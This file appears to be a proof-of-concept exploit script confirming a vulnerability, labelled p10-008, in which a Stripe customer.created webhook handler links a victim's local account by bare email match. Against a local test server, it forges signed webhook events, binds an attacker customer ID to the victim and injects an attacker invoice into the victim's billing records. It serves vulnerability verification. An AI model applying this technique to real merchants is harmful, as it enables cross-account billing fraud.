#!/usr/bin/env python3
"""PoC for p10-008: Stripe customer.created auto-links local accounts by bare email match.

Attack (real-world shape):
  1. Attacker knows victim's signup email (victim.p10-008@legit.test).
  2. Attacker starts a Stripe Checkout / payment-link purchase and enters the
     victim's email. Stripe creates a customer for the ATTACKER's payment session
     but carrying the victim's email, and delivers a correctly-signed
     `customer.created` webhook to the merchant.
  3. billing.ts `case 'customer.created'` matches the victim's local row by
     `email = ?` where stripe_customer_id IS NULL and runs
     UPDATE customers SET stripe_customer_id = <attacker cus_id> WHERE email = victim.
  4. Follow-up events for the attacker's own Stripe activity (e.g. invoice.paid)
     now resolve via stripe_customer_id to the VICTIM's row: attacker-controlled
     billing records are projected into the victim's account.

The PoC plays Stripe's delivery role by signing with the merchant webhook secret
(set identically in setup.sh); the event *content* is exactly what Stripe emits
when the attacker types the victim's email at checkout. The signature gate is
demonstrated working first (unsigned request -> 400), so nothing is bypassed.

Usage: poc.py [BASE_URL]   (defaults to http://127.0.0.1:8799; {{BASE_URL}} is
substituted at confirm time)
"""

import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 and "{{" not in sys.argv[1] else "http://127.0.0.1:8799"
WEBHOOK_SECRET = os.environ.get("STRIPE_WEBHOOK_SECRET", "poc-whsec-5f3e2d1c0b9a8776")
VICTIM_EMAIL = "victim.p10-008@legit.test"
ATTACKER_CUS = "cus_attacker_p10_008_%d" % int(time.time())
REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
WORKERS = os.path.join(REPO, "site", "workers")


def post(path, body, headers):
    req = urllib.request.Request(
        BASE + path, data=body.encode(), method="POST",
        headers={"content-type": "application/json", **headers},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def stripe_sign(payload):
    """Stripe signature scheme: t=<unix>,v1=hmac_sha256(secret, f"{t}.{payload}")"""
    t = str(int(time.time()))
    mac = hmac.new(WEBHOOK_SECRET.encode(), f"{t}.{payload}".encode(), hashlib.sha256)
    return t, f"t={t},v1={mac.hexdigest()}"


def deliver(event):
    payload = json.dumps(event)
    _, sig = stripe_sign(payload)
    return post("/api/stripe/webhook", payload, {"stripe-signature": sig})


def d1(sql):
    out = subprocess.run(
        ["npx", "wrangler", "d1", "execute", "omg-platform", "--local", "--json",
         "--command", sql],
        cwd=WORKERS, capture_output=True, text=True, timeout=120,
    )
    lines = out.stdout.splitlines()
    start = next((i for i, l in enumerate(lines) if l.lstrip().startswith("[")), None)
    if start is None:
        return []
    return json.loads("\n".join(lines[start:]))[0]["results"]


# --- Reset any prior PoC state (idempotent re-runs) -------------------------
d1(f"DELETE FROM invoices WHERE stripe_invoice_id LIKE '%poc008%'")
d1(f"UPDATE customers SET stripe_customer_id = NULL WHERE email = '{VICTIM_EMAIL}'")

# --- Step 0: control — the signature gate is active -------------------------
code, _ = post("/api/stripe/webhook", "{}", {})
print(f"[*] Control: unsigned POST /api/stripe/webhook -> HTTP {code} (must be 4xx)")
assert 400 <= code < 500, "signature gate unexpectedly open"

# --- Step 1: attacker triggers customer.created with VICTIM's email ---------
# Exactly what Stripe emits when the attacker enters the victim's email at checkout.
event = {
    "id": "evt_poc008_link_%d" % int(time.time()),
    "type": "customer.created",
    "data": {"object": {
        "id": ATTACKER_CUS,
        "object": "customer",
        "email": VICTIM_EMAIL,          # <-- the entire attack: attacker-chosen value
        "metadata": {},
    }},
}
code, body = deliver(event)
print(f"[*] Deliver signed customer.created (attacker {ATTACKER_CUS}, "
      f"email={VICTIM_EMAIL}) -> HTTP {code}: {body.strip()}")

# --- Step 2: attacker's own invoice.paid projects onto the victim row -------
inv_event = {
    "id": "evt_poc008_inv_%d" % int(time.time()),
    "type": "invoice.paid",
    "data": {"object": {
        "id": "in_attacker_poc008",
        "object": "invoice",
        "customer": ATTACKER_CUS,
        "amount_paid": 66600,
        "currency": "usd",
        "status": "paid",
        "period_start": int(time.time()) - 86400,
        "period_end": int(time.time()),
    }},
}
code2, body2 = deliver(inv_event)
print(f"[*] Deliver signed invoice.paid for attacker's customer -> HTTP {code2}: {body2.strip()}")

# --- Step 3: observe cross-account linkage in D1 ----------------------------
rows = d1("SELECT id, stripe_customer_id, tier FROM customers "
          f"WHERE email = '{VICTIM_EMAIL}'")
linked = rows and rows[0].get("stripe_customer_id") == ATTACKER_CUS
print(f"[*] Victim row after attack: {rows}")

invs = d1("SELECT i.customer_id, i.stripe_invoice_id, i.amount_cents "
          "FROM invoices i JOIN customers c ON c.id = i.customer_id "
          f"WHERE c.email = '{VICTIM_EMAIL}'")
print(f"[*] Invoices now attached to victim's customer id: {invs}")
polluted = any(i["stripe_invoice_id"] == "in_attacker_poc008" and
               i["customer_id"] == "victim-local-row-008" for i in invs)

if linked and polluted:
    print(f"\n[+] Cross-account bind succeeded: victim '{VICTIM_EMAIL}' is now bound to "
          f"the attacker's Stripe customer {ATTACKER_CUS}; an invoice from the "
          f"attacker's own Stripe activity was written into the victim's billing records.")
    print(json.dumps({
        "status": "confirmed",
        "evidence": ("customers row of victim email updated via signed customer.created "
                     "webhook to carry attacker stripe_customer_id (%s); subsequent "
                     "invoice.paid for that attacker customer inserted into victim's "
                     "invoices (customer_id=victim-local-row-008)" % ATTACKER_CUS),
        "notes": ("control: unsigned webhook -> %d (gate intact); PoC signs with merchant "
                  "secret playing Stripe's delivery role — event email field is the "
                  "attacker-chosen input, as produced by real checkout with victim email"
                  % code),
    }))
else:
    print("\n[-] Linkage or projection did not occur.")
    print(json.dumps({"status": "failed", "evidence": "linked=%s polluted=%s rows=%s"
                      % (linked, polluted, rows), "notes": ""}))
